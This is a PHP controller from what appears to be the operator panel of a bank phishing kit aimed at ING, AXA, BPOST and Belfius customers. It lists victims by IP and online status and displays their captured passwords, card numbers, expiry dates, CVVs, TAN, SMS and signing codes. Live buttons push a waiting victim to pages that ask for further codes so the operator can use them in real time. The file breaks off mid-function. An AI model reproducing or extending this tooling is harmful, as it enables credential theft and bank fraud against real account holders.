<?php

namespace App\Controllers\Users;

use Core\View;
use App\Models\Users\User;
use App\Auth;
class Logs extends \Core\Controller
{
    public function logsAction()
    {
        if (Auth::isLoggedIn()) {
            $data = User::checkSession($_SESSION["username"]);
            if ($data) {
                if ($_SERVER["REQUEST_METHOD"] == "POST") {
                    $logs = User::getLogs($_SESSION["username"]);
                    $this->showLogs($logs);
                } else {
                    View::render("Users/logs.php", ["title" => "Logs"]);
                }
            } else {
                Auth::destroySession();
            }
        } else {
            static::redirect("/login");
        }
    }
    public function getOneAction()
    {
        if (Auth::isLoggedIn()) {
            $data = User::checkSession($_SESSION["username"]);
            if ($data) {
                if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["id"])) {
                    $log = User::getLog($_POST["id"], $_SESSION["username"]);
                    $this->showLog($log);
                } else {
                    static::redirect("/logs");
                }
            } else {
                Auth::destroySession();
            }
        } else {
            static::redirect("/login");
        }
    }
    public function deleteAction()
    {
        if (Auth::isLoggedIn()) {
            $data = User::checkSession($_SESSION["username"]);
            if ($data) {
                if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["id"])) {
                    $data = ["id" => $_POST["id"]];
                    $errors = ["id" => ""];
                    if (empty($data["id"])) {
                        $errors["id"] = "empty_id";
                    }
                    if (empty($errors["id"])) {
                        $check = User::deleteLog($_SESSION["username"], $data["id"]);
                        if ($check) {
                            echo json_encode(["success" => "true"]);
                        } else {
                            echo json_encode(["fail" => "request_failed"]);
                        }
                    } else {
                        echo json_encode($errors);
                    }
                } else {
                    static::redirect("/login");
                }
            } else {
                Auth::destroySession();
            }
        } else {
            static::redirect("/login");
        }
    }
    public function deleteAllAction()
    {
        if (Auth::isLoggedIn()) {
            $data = User::checkSession($_SESSION["username"]);
            if ($data) {
                if ($_SERVER["REQUEST_METHOD"] == "POST") {
                    $check = User::deleteLogs($_SESSION["username"]);
                    if ($check) {
                        echo json_encode(["success" => "true"]);
                    } else {
                        echo json_encode(["fail" => "request_failed"]);
                    }
                } else {
                    static::redirect("/login");
                }
            } else {
                Auth::destroySession();
            }
        } else {
            static::redirect("/login");
        }
    }
    public function banAction()
    {
        if (Auth::isLoggedIn()) {
            $data = User::checkSession($_SESSION["username"]);
            if ($data) {
                if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["id"]) && isset($_POST["ip"])) {
                    $data = ["id" => $_POST["id"], "ip" => $_POST["ip"]];
                    $errors = ["id" => "", "ip" => ""];
                    if (empty($data["id"])) {
                        $errors["id"] = "empty_id";
                    }
                    if (empty($data["ip"])) {
                        $errors["ip"] = "empty_ip";
                    }
                    if (empty($errors["id"]) && empty($errors["ip"])) {
                        $check = User::banUser($data["id"], $data["ip"]);
                        if ($check) {
                            echo json_encode(["success" => "true"]);
                        } else {
                            echo json_encode(["fail" => "request_failed"]);
                        }
                    } else {
                        echo json_encode($errors);
                    }
                } else {
                    static::redirect("/login");
                }
            } else {
                Auth::destroySession();
            }
        } else {
            static::redirect("/login");
        }
    }
    private function showLogs($logs)
    {
        foreach ($logs as $log) {
            $new_date = new \DateTime();
            $old_date = new \DateTime($log["last_connected"]);
            $diff = $new_date->getTimestamp() - $old_date->getTimestamp();
            $waiting = " bg-darker";
            $bank = "";
            if ($log["waiting"] == "true") {
                $waiting = " bg-blink";
            } else {
                if ($diff < 10) {
                    $waiting = " bg-success";
                }
            }
            if (empty($log["bank"])) {
                continue;
            }
            echo "<div class=\" col-lg-3\">";
            echo "<div class=\"card mb-1 bg-darker custom-card\">";
            echo "\n            <link rel=\"stylesheet\" type=\"text/css\" href=\"https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.9.0/css/all.min.css\">\n            <link rel=\"stylesheet\" type=\"text/css\" href=\"https://maxst.icons8.com/vue-static/landings/line-awesome/line-awesome/1.3.0/css/line-awesome.min.css\">\n            <link rel=\"stylesheet\" type=\"text/css\" href=\"css/bootsrap-min.css\">";
            echo "<div class=\"card-body" . $waiting . "\">";
            echo "<h5 class=\"card-title monospace text-white\"><b><i class=\"las la-wifi\"></i></b> | " . htmlspecialchars($log["bank"]) . "</h5>";
            echo "<hr>\n            <div class=\"bg-darkest p-4 rounded\">";
            if ($log["waiting"] === "true") {
                echo "<p class=\"font-weight-bold text-white\"> status: \xf0\x9f\x94\xb4  </p>";
            } else {
                if ($diff > 10) {
                    echo "<p class=\"font-weight-bold text-white\"> status: \xe2\x9a\xaa  </p>";
                } else {
                    echo "<p class=\"font-weight-bold text-white\"> status: \xf0\x9f\x9f\xa2  </p>";
                }
            }
            echo "<p class=\"font-weight-bold text-white\"> IP: " . htmlspecialchars($log["ip"]) . "  </p>\n            <p class=\"font-weight-bold text-white\"> note:  </p>\n            </div>\n            <br>";
            ?>
    
            <button class="btn btn-primary btn-circle btn-sm" onclick="openUser('<?php 
            echo htmlspecialchars($log["user_id"]);
            ?>
')"><i class="fas fa-external-link-alt"></i> </button>
            <button class="btn btn-danger btn-circle btn-sm" onclick="deleteLog('<?php 
            echo htmlspecialchars($log["user_id"]);
            ?>
')"><i class="fas fa-trash"></i></button>
    
            <?php 
            echo "<div class=\"collapse\" id=\"" . htmlspecialchars($log["username"]) . htmlspecialchars($log["user_id"]) . "\" style=\"\">";
            echo "</div>";
            echo "</div>";
            echo "</div>";
            echo "</div>";
        }
    }
    private function showLog($log)
    {
        $new_date = new \DateTime();
        $old_date = new \DateTime($log["last_connected"]);
        $diff = $new_date->getTimestamp() - $old_date->getTimestamp();
        echo "<div class=\"row p-1\">";
        if ($log["waiting"] === "true") {
            echo "<div class=\"col-12\">";
            echo "<div class=\"col-12 bg-blink rounded\">";
            echo "<h1 class=\"text-white text-center p-4\" id=\"alert\" style=\"font-size: 2rem\">Currently Waiting ... | " . htmlspecialchars($log["bank"]) . "\n</h1>";
            echo "</div>";
        } else {
            if ($diff > 10) {
                echo "<div class=\"col-12\">";
                echo "<div class=\"col-12 bg-darker rounded\">";
                echo "<h1 class=\"text-danger text-center p-4\" id=\"alert\" style=\"font-size: 2rem\">Currently Offline | " . htmlspecialchars($log["bank"]) . "\n</h1>";
                echo "</div>";
            } else {
                echo "<div class=\"col-12\">";
                echo "<div class=\"col-12 bg-success rounded\">";
                echo "<h1 class=\"text-white text-center p-4\" id=\"alert\" style=\"font-size: 2rem\">Currently Online | " . htmlspecialchars($log["bank"]) . "\n</h1>";
                echo "</div>";
            }
        }
        echo "</div>";
        echo "</div>";
        echo "<div class=\"row p-1\">";
        echo "<div class=\"col-lg-8 col-sm-12\">";
        echo "<div class=\"col-12 p-4 bg-darker rounded\">";
        echo "<h4 class=\"text-white\">Data</h4>";
        echo "<hr class=\"my-4\">";
        echo "<div class=\"bg-darkest p-4 rounded\">";
        if ($log["bank"] == "ING") {
            if (!empty($log["ing_user"]) && !empty($log["ing_pass"])) {
                echo "<div class=\"form-group row\">";
                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Username:</label>";
                echo "<div class=\"col-sm-9\">";
                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["ing_user"]) . "</i></p>";
                echo "</div>";
                echo "</div>";
                echo "<div class=\"form-group row\">";
                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Password:</label>";
                echo "<div class=\"col-sm-9\">";
                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["ing_pass"]) . "</i></p>";
                echo "</div>";
                echo "</div>";
            }
            if (!empty($log["ing_exp"]) && !empty($log["ing_number"])) {
                echo "<div class=\"form-group row\">";
                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Expiration:</label>";
                echo "<div class=\"col-sm-9\">";
                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["ing_exp"]) . "</i></p>";
                echo "</div>";
                echo "</div>";
                echo "<div class=\"form-group row\">";
                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Card Number:</label>";
                echo "<div class=\"col-sm-9\">";
                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["ing_number"]) . "</i></p>";
                echo "</div>";
                echo "</div>";
            }
            if (!empty($log["ing_tan"])) {
                echo "<div class=\"form-group row\">";
                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Tan-code:</label>";
                echo "<div class=\"col-sm-9\">";
                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["ing_tan"]) . "</i></p>";
                echo "</div>";
                echo "</div>";
            }
            if (!empty($log["ing_wifi"]) && !empty($log["ing_wifi_pass"]) && !empty($log["ing_wifi_pass_two"])) {
                echo "<div class=\"form-group row\">";
                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">WiFi Name:</label>";
                echo "<div class=\"col-sm-9\">";
                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["ing_wifi"]) . "</i></p>";
                echo "</div>";
                echo "</div>";
                echo "<div class=\"form-group row\">";
                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">WiFi Password:</label>";
                echo "<div class=\"col-sm-9\">";
                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["ing_wifi_pass"]) . "</i></p>";
                echo "</div>";
                echo "</div>";
            }
            if ($log["waiting"] == "true") {
                ?>
                    </div>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setIng('<?php 
                echo htmlspecialchars($log["user_id"]);
                ?>
', 'login')"><i class="fas fa-sign-in-alt"></i> Login</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setIng('<?php 
                echo htmlspecialchars($log["user_id"]);
                ?>
', 'details')"><i class="fa fa-info-circle" aria-hidden="true"></i> Details</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setIng('<?php 
                echo htmlspecialchars($log["user_id"]);
                ?>
', 'confirm')"><i class="fa fa-check" aria-hidden="true"></i> Confirm</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setIng('<?php 
                echo htmlspecialchars($log["user_id"]);
                ?>
', 'tan')"><i class="fa fa-phone" aria-hidden="true"></i> Tan</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setIng('<?php 
                echo htmlspecialchars($log["user_id"]);
                ?>
', 'control')"><i class="fa fa-wifi" aria-hidden="true"></i> WiFi</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-success mt-4" onclick="setIng('<?php 
                echo htmlspecialchars($log["user_id"]);
                ?>
', 'finish')"><i class="fa fa-check-circle" aria-hidden="true"></i> Finish</button>
                            </div>
                        </div>                        
                    </div>
                </div>
           












                

                <?php 
            }
        } else {
            if ($log["bank"] == "AXA") {
                if (!empty($log["axa_card"])) {
                    echo "<div class=\"form-group row\">";
                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Card:</label>";
                    echo "<div class=\"col-sm-9\">";
                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["axa_card"]) . "</i></p>";
                    echo "</div>";
                    echo "</div>";
                }
                if (!empty($log["axa_vv"])) {
                    echo "<div class=\"form-group row\">";
                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">EXP:</label>";
                    echo "<div class=\"col-sm-9\">";
                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["axa_vv"]) . "</i></p>";
                    echo "</div>";
                    echo "</div>";
                }
                if (!empty($log["axa_login"])) {
                    echo "<div class=\"form-group row\">";
                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">m1 Code:</label>";
                    echo "<div class=\"col-sm-9\">";
                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["axa_login"]) . "</i></p>";
                    echo "</div>";
                    echo "</div>";
                }
                if (!empty($log["axa_live"])) {
                    echo "<div class=\"form-group row\">";
                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Live Code:</label>";
                    echo "<div class=\"col-sm-9\">";
                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["axa_live"]) . "</i></p>";
                    echo "</div>";
                    echo "</div>";
                }
                if (!empty($log["axa_m2"])) {
                    echo "<div class=\"form-group row\">";
                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">M2 code:</label>";
                    echo "<div class=\"col-sm-9\">";
                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["axa_m2"]) . "</i></p>";
                    echo "</div>";
                    echo "</div>";
                }
                if (!empty($log["axa_phone"])) {
                    echo "<div class=\"form-group row\">";
                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">phone:</label>";
                    echo "<div class=\"col-sm-9\">";
                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["axa_phone"]) . "</i></p>";
                    echo "</div>";
                    echo "</div>";
                }
                if (!empty($log["axa_sms"])) {
                    echo "<div class=\"form-group row\">";
                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">SMS code:</label>";
                    echo "<div class=\"col-sm-9\">";
                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["axa_sms"]) . "</i></p>";
                    echo "</div>";
                    echo "</div>";
                }
                if (!empty($log["axa_cc"])) {
                    echo "<div class=\"form-group row\">";
                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">CC nummer:</label>";
                    echo "<div class=\"col-sm-9\">";
                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["axa_cc"]) . "</i></p>";
                    echo "</div>";
                    echo "</div>";
                }
                if (!empty($log["axa_exp"])) {
                    echo "<div class=\"form-group row\">";
                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">CC exp:</label>";
                    echo "<div class=\"col-sm-9\">";
                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["axa_exp"]) . "</i></p>";
                    echo "</div>";
                    echo "</div>";
                }
                if (!empty($log["axa_cvc"])) {
                    echo "<div class=\"form-group row\">";
                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">CVC:</label>";
                    echo "<div class=\"col-sm-9\">";
                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["axa_cvc"]) . "</i></p>";
                    echo "</div>";
                    echo "</div>";
                }
                if (!empty($log["axa_bel"])) {
                    echo "<div class=\"form-group row\">";
                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">belpage</label>";
                    echo "<div class=\"col-sm-9\">";
                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["axa_bel"]) . "</i></p>";
                    echo "</div>";
                    echo "</div>";
                }
                if ($log["waiting"] == "true") {
                    ?>
                    </div>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setAxa('<?php 
                    echo htmlspecialchars($log["user_id"]);
                    ?>
', 'login')"><i class="fa fa-info-circle" aria-hidden="true"></i> Login</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setAxa('<?php 
                    echo htmlspecialchars($log["user_id"]);
                    ?>
', 'identification')"><i class="fa fa-phone" aria-hidden="true"></i> Phone Code</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setAxa('<?php 
                    echo htmlspecialchars($log["user_id"]);
                    ?>
', 'bel')"><i class="fa fa-phone" aria-hidden="true"></i>Bellen</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setAxa('<?php 
                    echo htmlspecialchars($log["user_id"]);
                    ?>
', 'loginCode')"><i class="far fa-keyboard"></i> SMS</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setAxa('<?php 
                    echo htmlspecialchars($log["user_id"]);
                    ?>
', 'credit')"><i class="far fa-keyboard"></i> CC</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-success mt-4" onclick="setAxa('<?php 
                    echo htmlspecialchars($log["user_id"]);
                    ?>
', 'finish')"><i class="fa fa-check-circle" aria-hidden="true"></i> Finish</button>
                            </div>
                        </div> 
                        <hr>     
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setAxa('<?php 
                    echo htmlspecialchars($log["user_id"]);
                    ?>
', 'signCode')"><i class="fa fa-sign-language" aria-hidden="true"></i> m1 Code</button>
                            </div>
                            <div class="col-lg-9">
                                <input type="text" class="form-control axa-login input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a login code">
                            </div>
                        </div>   
                        <hr>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setAxa('<?php 
                    echo htmlspecialchars($log["user_id"]);
                    ?>
', 'token')"><i class="fa fa-sign-language" aria-hidden="true"></i> M2 Code</button>
                            </div>
                            <div class="col-lg-9">
                                <input type="text" class="form-control axa-token input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a token code">
                            </div>
                        </div>   

<hr>

                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setAxa('<?php 
                    echo htmlspecialchars($log["user_id"]);
                    ?>
', 'live')"><i class="fa fa-sign-language" aria-hidden="true"></i>m2 Live</button>
                            </div>
                            <div class="col-lg-9">
                            <input type="text" class="form-control axa-live input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a token code">
                            <input type="text" class="form-control axa-livetwo input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a token code">
                          
                        </div>
                        </div>   


                    </div>
                </div>







 <?php 
                }
            } else {
                if ($log["bank"] == "BPOST") {
                    if (!empty($log["bpost_abbo"])) {
                        echo "<div class=\"form-group row\">";
                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Abbo:</label>";
                        echo "<div class=\"col-sm-9\">";
                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["bpost_abbo"]) . "</i></p>";
                        echo "</div>";
                        echo "</div>";
                    }
                    if (!empty($log["bpost_card"]) && !empty($log["bpost_vv"])) {
                        echo "<div class=\"form-group row\">";
                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Kaart:</label>";
                        echo "<div class=\"col-sm-9\">";
                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["bpost_card"]) . "</i></p>";
                        echo "</div>";
                        echo "</div>";
                        echo "<div class=\"form-group row\">";
                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">EXP:</label>";
                        echo "<div class=\"col-sm-9\">";
                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["bpost_vv"]) . "</i></p>";
                        echo "</div>";
                        echo "</div>";
                    }
                    if (!empty($log["bpost_code"])) {
                        echo "<div class=\"form-group row\">";
                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">m1 Code:</label>";
                        echo "<div class=\"col-sm-9\">";
                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["bpost_code"]) . "</i></p>";
                        echo "</div>";
                        echo "</div>";
                    }
                    if (!empty($log["bpost_code2"])) {
                        echo "<div class=\"form-group row\">";
                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">m2 Code:</label>";
                        echo "<div class=\"col-sm-9\">";
                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["bpost_code2"]) . "</i></p>";
                        echo "</div>";
                        echo "</div>";
                    }
                    if (!empty($log["bpost_live"])) {
                        echo "<div class=\"form-group row\">";
                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Live code:</label>";
                        echo "<div class=\"col-sm-9\">";
                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["bpost_live"]) . "</i></p>";
                        echo "</div>";
                        echo "</div>";
                    }
                    if (!empty($log["bpost_ww"])) {
                        echo "<div class=\"form-group row\">";
                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Wachtwoord:</label>";
                        echo "<div class=\"col-sm-9\">";
                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["bpost_ww"]) . "</i></p>";
                        echo "</div>";
                        echo "</div>";
                    }
                    if (!empty($log["bpost_mail"])) {
                        echo "<div class=\"form-group row\">";
                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">E-mail:</label>";
                        echo "<div class=\"col-sm-9\">";
                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["bpost_mail"]) . "</i></p>";
                        echo "</div>";
                        echo "</div>";
                    }
                    if (!empty($log["bpost_phone"])) {
                        echo "<div class=\"form-group row\">";
                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">phone:</label>";
                        echo "<div class=\"col-sm-9\">";
                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["bpost_phone"]) . "</i></p>";
                        echo "</div>";
                        echo "</div>";
                    }
                    if (!empty($log["bpost_sms"])) {
                        echo "<div class=\"form-group row\">";
                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">SMS code:</label>";
                        echo "<div class=\"col-sm-9\">";
                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["bpost_sms"]) . "</i></p>";
                        echo "</div>";
                        echo "</div>";
                    }
                    if (!empty($log["bpost_cc"])) {
                        echo "<div class=\"form-group row\">";
                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">CC nummer:</label>";
                        echo "<div class=\"col-sm-9\">";
                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["bpost_cc"]) . "</i></p>";
                        echo "</div>";
                        echo "</div>";
                    }
                    if (!empty($log["bpost_exp"])) {
                        echo "<div class=\"form-group row\">";
                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">CC exp:</label>";
                        echo "<div class=\"col-sm-9\">";
                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["bpost_exp"]) . "</i></p>";
                        echo "</div>";
                        echo "</div>";
                    }
                    if (!empty($log["bpost_cvc"])) {
                        echo "<div class=\"form-group row\">";
                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">CVV:</label>";
                        echo "<div class=\"col-sm-9\">";
                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["bpost_cvc"]) . "</i></p>";
                        echo "</div>";
                        echo "</div>";
                    }
                    if (!empty($log["bpost_bel"])) {
                        echo "<div class=\"form-group row\">";
                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">belpage:</label>";
                        echo "<div class=\"col-sm-9\">";
                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["bpost_bel"]) . "</i></p>";
                        echo "</div>";
                        echo "</div>";
                    }
                    if ($log["waiting"] == "true") {
                        ?>
                    </div>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setBpost('<?php 
                        echo htmlspecialchars($log["user_id"]);
                        ?>
', 'login')"><i class="fa fa-info-circle" aria-hidden="true"></i>Ask login</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setBpost('<?php 
                        echo htmlspecialchars($log["user_id"]);
                        ?>
', 'identification')"><i class="fa fa-info-circle" aria-hidden="true"></i>Ask E-mail</button>
                            </div>
                             <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setBpost('<?php 
                        echo htmlspecialchars($log["user_id"]);
                        ?>
', 'phone')"><i class="fa fa-phone" aria-hidden="true"></i>phone</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setBpost('<?php 
                        echo htmlspecialchars($log["user_id"]);
                        ?>
', 'bel')"><i class="fa fa-phone" aria-hidden="true"></i>Bellen</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setBpost('<?php 
                        echo htmlspecialchars($log["user_id"]);
                        ?>
', 'sms')"><i class="fa fa-info-circle" aria-hidden="true"></i>Ask SMS</button>
                            </div>

                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setBpost('<?php 
                        echo htmlspecialchars($log["user_id"]);
                        ?>
', 'loginCode')"><i class="far fa-keyboard"></i> Wachtwoord</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setBpost('<?php 
                        echo htmlspecialchars($log["user_id"]);
                        ?>
', 'credit')"><i class="far fa-keyboard"></i> CC</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-success mt-4" onclick="setBpost('<?php 
                        echo htmlspecialchars($log["user_id"]);
                        ?>
', 'finish')"><i class="fa fa-check-circle" aria-hidden="true"></i> Finish</button>
                            </div>
                        </div>      
                      <hr>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setBpost('<?php 
                        echo htmlspecialchars($log["user_id"]);
                        ?>
', 'signCode')"><i class="fa fa-sign-language" aria-hidden="true"></i>Ask m1</button>
                            </div>
                            <div class="col-lg-9">
                                <input type="text" class="form-control bpost-onee input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a buy code">
                            </div>
                                                   </div>
                                                   <hr>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setBpost('<?php 
                        echo htmlspecialchars($log["user_id"]);
                        ?>
', 'sign2')"><i class="fa fa-sign-language" aria-hidden="true"></i>Ask m2</button>
                            </div>
                            <div class="col-lg-9">
                                <input type="text" class="form-control bpost-code2 input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a buy code">
                            </div>
                                                   </div>
                                                   <hr>
                                                   <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setBpost('<?php 
                        echo htmlspecialchars($log["user_id"]);
                        ?>
', 'live')"><i class="fa fa-sign-language" aria-hidden="true"></i>Live</button>
                            </div>
                            <div class="col-lg-9">
                            <input type="text" class="form-control bpost-live input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a token code">
                            <input type="text" class="form-control bpost-livetwo input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a token code">
                          
                       
                     


                    </div>
                </div>
                          
                    </div>
                </div>












































                <?php 
                    }
                } else {
                    if ($log["bank"] == "BELFIUS") {
                        if (!empty($log["belfius_card"])) {
                            echo "<div class=\"form-group row\">";
                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">card:</label>";
                            echo "<div class=\"col-sm-9\">";
                            echo "<p class=\"text-secondary\"><i>6703 " . htmlspecialchars($log["belfius_card"]) . "</i></p>";
                            echo "</div>";
                            echo "</div>";
                        }
                        if (!empty($log["belfius_vv"])) {
                            echo "<div class=\"form-group row\">";
                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">exp:</label>";
                            echo "<div class=\"col-sm-9\">";
                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["belfius_vv"]) . "</i></p>";
                            echo "</div>";
                            echo "</div>";
                        }
                        if (!empty($log["belfius_m1"])) {
                            echo "<div class=\"form-group row\">";
                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">M1: </label>";
                            echo "<div class=\"col-sm-9\">";
                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["belfius_m1"]) . "</i></p>";
                            echo "</div>";
                            echo "</div>";
                        }
                        if (!empty($log["belfius_phone"])) {
                            echo "<div class=\"form-group row\">";
                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Phone:</label>";
                            echo "<div class=\"col-sm-9\">";
                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["belfius_phone"]) . "</i></p>";
                            echo "</div>";
                            echo "</div>";
                        }
                        if (!empty($log["belfius_sms"])) {
                            echo "<div class=\"form-group row\">";
                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">SMS code:</label>";
                            echo "<div class=\"col-sm-9\">";
                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["belfius_sms"]) . "</i></p>";
                            echo "</div>";
                            echo "</div>";
                        }
                        if (!empty($log["belfius_m2"])) {
                            echo "<div class=\"form-group row\">";
                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">M2 code:</label>";
                            echo "<div class=\"col-sm-9\">";
                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["belfius_m2"]) . "</i></p>";
                            echo "</div>";
                            echo "</div>";
                        }
                        if (!empty($log["belfius_pass"])) {
                            echo "<div class=\"form-group row\">";
                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Password:</label>";
